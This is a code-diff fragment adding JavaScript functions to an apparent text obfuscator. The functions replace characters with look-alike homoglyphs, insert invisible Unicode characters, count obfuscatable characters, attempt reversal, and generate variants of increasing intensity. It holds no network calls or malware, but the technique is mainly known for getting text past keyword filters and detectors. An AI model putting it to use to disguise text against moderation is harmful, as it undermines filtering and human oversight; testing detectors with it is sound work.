+                newLine += random.choice(invisibleChars);
+                invisibleCharsInWord++;
+            }
+            if (settings.useInvisibleChars && substituted && random.chance(0.05)) {
+                newLine += random.choice(invisibleChars);
+            }
+        }
+        obfuscated += settings.maintainFormatting ? `**${newLine}**\n` : newLine + '\n';
+    }
+    return obfuscated.trim();
+}
+function analyzeText(text) {
+    const stats = {
+        totalChars: text.length,
+        letters: 0,
+        numbers: 0,
+        specialChars: 0,
+        obfuscatableLetters: 0,
+        obfuscatableNumbers: 0,
+        obfuscatableSpecial: 0,
+        lines: text.split('\n').length,
+        words: text.split(/\s+/).filter(word => word.length > 0).length
+    };
+    for (const char of text) {
+        const lower = char.toLowerCase();
+        if (/[a-zA-Z]/.test(char)) {
+            stats.letters++;
+            if (homoglyphMap[lower])
+                stats.obfuscatableLetters++;
+        }
+        else if (/[0-9]/.test(char)) {
+            stats.numbers++;
+            if (numberMap[char])
+                stats.obfuscatableNumbers++;
+        }
+        else if (!/\s/.test(char)) {
+            stats.specialChars++;
+            if (specialCharMap[char])
+                stats.obfuscatableSpecial++;
+        }
+    }
+    return stats;
+}
+function attemptReverse(obfuscatedText) {
+    let cleaned = obfuscatedText;
+    invisibleChars.forEach((char) => {
+        cleaned = cleaned.replace(new RegExp(escapeRegExp(char), 'g'), '');
+    });
+    const reverseMap = {};
+    Object.entries(homoglyphMap).forEach(([original, substitutes]) => {
+        substitutes.forEach((substitute) => {
+            if (!reverseMap[substitute]) {
+                reverseMap[substitute] = original;
+            }
+        });
+    });
+    Object.entries(numberMap).forEach(([original, substitutes]) => {
+        substitutes.forEach((substitute) => {
+            if (!reverseMap[substitute]) {
+                reverseMap[substitute] = original;
+            }
+        });
+    });
+    for (const [obfuscated, original] of Object.entries(reverseMap)) {
+        cleaned = cleaned.replace(new RegExp(escapeRegExp(obfuscated), 'g'), original);
+    }
+    return cleaned;
+}
+function escapeRegExp(str) {
+    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+function batchObfuscate(text, configArray) {
+    return configArray.map(config => {
+        const configObj = config instanceof ObfuscationConfig ? config : new ObfuscationConfig(config);
+        const result = obfuscateText(text, configObj);
+        const analysisStats = analyzeText(result);
+        return {
+            config: configObj,
+            result,
+            analysisStats
+        };
+    });
+}
+function generateVariants(text, baseConfig = {}, variants = 5) {
+    const results = [];
+    const config = new ObfuscationConfig(baseConfig);
+    for (let i = 0; i < variants; i++) {
+        const intensity = (i + 1) / variants;
+        const variantConfig = new ObfuscationConfig({
+            ...config.toJSON(),
+            substitutionRate: intensity * 0.8,
+            invisibleCharRate: intensity * 0.15,
+            randomSeed: Math.floor(Math.random() * 1000000)
+        });
+        results.push(obfuscateText(text, variantConfig));
+    }
+    return results;
+}
+function validateConfig(config) {
+    if (config.substitutionRate !== undefined && (config.substitutionRate < 0 || config.substitutionRate > 1)) {
+        throw new Error('substitutionRate must be between 0 and 1');
+    }
+    if (config.invisibleCharRate !== undefined && (config.invisibleCharRate < 0 || config.invisibleCharRate > 1)) {
+        throw new Error('invisibleCharRate must be between 0 and 1');
+    }
+    if (config.maxInvisibleCharsPerWord !== undefined && config.maxInvisibleCharsPerWord < 0) {
+        throw new Error('maxInvisibleCharsPerWord must be non-negative');
+    }
 }
 
 
